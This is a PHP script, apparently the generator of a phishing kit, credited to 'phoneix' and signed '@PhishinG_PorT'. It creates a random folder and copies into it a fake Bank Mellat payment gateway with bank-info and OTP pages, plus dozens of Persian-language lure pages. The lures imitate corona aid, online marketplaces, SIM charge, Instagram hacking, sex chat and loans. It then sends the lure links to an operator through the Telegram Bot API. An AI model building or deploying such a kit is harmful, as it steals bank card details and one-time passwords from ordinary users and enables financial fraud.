<?php 


//CODED BY phoneix
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}
//CODED BY phoneix
header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}



//CODED BY phoneix
$TOKENMS = stripslashes(htmlspecialchars($_POST['TOKEN']));
if(strstr($TOKENMS,'../source/')){
die('lfi and rfi detected');
}
$IDMS = intval(stripslashes(htmlspecialchars($_POST['ID'])));
if(strstr($IDMS,'../source/')){
die('lfi and rfi detected');
}

$re= "port";
$Rand=rand(10000,10000000); 
$TOKEN= '$TOKENESH';
$ID ='$IDISH';
mkdir($Rand);
$FileName = "$Rand/index.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
//Payment.mellat 
copy('../source/Mellat/Mellat.php', 'mellat.php'); 
copy('../source/Mellat/Mellat.php', 'index.php'); 
copy('../source/Mellat/Mellat.php', 'melat.php'); 
copy('../source/Mellat/Bankinfo.php', 'Bankinfo.php'); 
copy('../source/Mellat/xkiler.php', 'xkiler.php'); 
copy('../source/Mellat/OTP.php', 'OTP.php'); 

//page 
copy('../source/kmk.htm', 'kmk.htm');
copy('../source/shey.htm', 'shey.htm');
copy('../source/sharj.php', 'sharj.php');
copy('../source/dostyabi.php', 'dostyabi.php');
copy('../source/sighe.php', 'sighe.php');
copy('../source/makan.php', 'makan.php');
copy('../source/kala.html', 'kala.html');
copy('../source/mci.php', 'mci.php');
copy('../source/net6.php', 'net6.php');
copy('../source/number.php', 'number.php');
copy('../source/live.php', 'live.php');
copy('../source/cod.php', 'cod.php');
copy('../source/snap.php', 'snap.php');
copy('../source/tash.php', 'tash.php');
copy('../source/chat.php', 'chat.php');
copy('../source/insta.html', 'insta.html');
copy('../source/mask.html', 'mask.html');
copy('../source/saham.html', 'saham.html');
copy('../source/5G.php', '5G.php');
copy('../source/6gn.php', '6gn.php');
copy('../source/about-ust.html', 'about-ust.html');
copy('../source/consol.html', 'consol.html');
copy('../source/divar.html', 'divar.html');
copy('../source/divar1.html', 'divvar.html');
copy('../source/durbin.html', 'durbin.html');
copy('../source/hamta.html', 'hamta.html');
copy('../source/hania.php', 'hania.php');
copy('../source/internetmeli.html', 'internetmeli.html');
copy('../source/kontrolapp.html', 'kontrolapp.html');
copy('../source/pubguc.html', 'pubguc.html');
copy('../source/reg2.php', 'reg2.php');
copy('../source/reg4.php', 'reg4.php');
copy('../source/reg6.php', 'reg6.php');
copy('../source/register.php', 'register.php');
copy('../source/rightelnet15.html', 'rightelnet15.html');
copy('../source/rules-ust.html', 'rules-ust.html');
copy('../source/sabad-kala.php', 'sabad-kala.php');
copy('../source/tmember.html', 'tmember.html');
copy('../source/vam.html', 'vam.html');
copy('../source/vpn.html', 'vpn.html');
copy('../source/1sepb.html', '1sepb.html');
copy('../source/1sepf.html', '1sepf.html');
copy('../source/1sepl.html', '1sepl.html');
copy('../source/2sepb.html', '2sepb.html');
copy('../source/2sepf.html', '2sepf.html');
copy('../source/2sepl.html', '2sepl.html');
copy('../source/3sepb.html', '3sepb.html');
copy('../source/3sepf.html', '3sepf.html');
copy('../source/3sepl.html', '3sepl.html');
copy('../source/4sepb.html', '4sepb.html');
copy('../source/4sepf.html', '4sepf.html');
copy('../source/4sepl.html', '4sepl.html');
copy('../source/5sepb.html', '5sepb.html');
copy('../source/5sepf.html', '5sepf.html');
copy('../source/5sepl.html', '5sepl.html');
copy('../source/default.html', 'default.html');
copy('../source/storeinsta.html', 'storeinsta.html');
copy('../source/Sheypor.html', 'Sheypor.html');
?>
<meta content='0;url=../ok.html'http-equiv='refresh'/>
<center><P>Loading</p></center>
<?php
?>
");
$FileName = "$Rand/Userid.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN ='$TOKENMS';
$ID = '$IDMS';
?>
");

$FileName = "ok.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
header('Location: $Rand/index.php');
?>
");
	
		echo "<div id=stl>


</div>
"; 

include"info.php";
$Text = "عملیات با موفقیت انجام شد ✅
User Name : $Rand
Port : #mellat
➖➖
🌐 درگاه خام : 
$link/ir/$Rand/index.php?amount=20,000 
🌐 قالب های متصل به درگاه :

🔴 کمک به کرونایی ها  :
$link/ir/$Rand/kmk.htm
🔴 شیپور 2  :
$link/ir/$Rand/shey.htm
🔴 شارژ شو  :
$link/ir/$Rand/sharj.php
🔴 دوست یابی حافظون  :
$link/ir/$Rand/dostyabi.php
🔴 صیفه قدیمی  :
$link/ir/$Rand/sighe.php
🔴 مکان یاب  :
$link/ir/$Rand/makan.php
🔴 حمایت غذایی  :
$link/ir/$Rand/kala.html
🔴 شارژ MCI  :
$link/ir/$Rand/mci.php
🔴 نت ارزان  :
$link/ir/$Rand/net6.php
🔴 شماره مجازی  :
$link/ir/$Rand/number.php
🔴 لایو سکسی  :
$link/ir/$Rand/live.php
🔴 رمز OTP  :
$link/ir/$Rand/cod.php
🔴 اسنپ  :
$link/ir/$Rand/snap.php
🔴 ضریب انفجار  :
$link/ir/$Rand/tash.php
🔴 سکس چت تصویری  :
$link/ir/$Rand/chat.php
🔴 هک اینستا  :
$link/ir/$Rand/insta.html
🔴 فروش ماسک :
$link/ir/$Rand/mask.html
🔴 سهام عدالت  :
$link/ir/$Rand/saham.html
🔴 نت هدیه پاییز  :
$link/ir/$Rand/5G.php
🔴 فروش PS4  :
$link/ir/$Rand/consol.html
🔴 دیوار   :
$link/ir/$Rand/divar.html
🔴 دیوار 2  :
$link/ir/$Rand/divvar.html
🔴 شیپور   :
$link/ir/$Rand/Sheypor.html
🔴 دوربین لخت کن   :
$link/ir/$Rand/durbin.html
🔴 همتا   :
$link/ir/$Rand/hamta.html
🔴 صیغه یابی هانیا   :
$link/ir/$Rand/hania.php
🔴 نت برای در خانه بمانیم   :
$link/ir/$Rand/internetmeli.html
🔴 ردیاب نامحسوس گوشی   :
$link/ir/$Rand/kontrolapp.html
🔴 یوسی پابجی   :
$link/ir/$Rand/pubguc.html
🔴 سبد کالا   :
$link/ir/$Rand/sabad-kala.php
🔴 نت رایتل   :
$link/ir/$Rand/rightelnet15.html
🔴 فروش ممبر   :
$link/ir/$Rand/tmember.html
🔴 فروش فالور ...   :
$link/ir/$Rand/default.html
🔴 استوری مخفی   :
$link/ir/$Rand/storeinsta.html
🔴 فروش VPN   :
$link/ir/$Rand/vpn.html
🔴 وام   :
$link/ir/$Rand/vam.html
➖➖
⚠️ @PhishinG_PorT";
$ok =  file_get_contents("https://api.telegram.org/bot".$TOKENMS."/SendMessage?chat_id=".$IDMS."&text=".urlencode($Text));	
header('Location: ok.php');	

?>

 
	
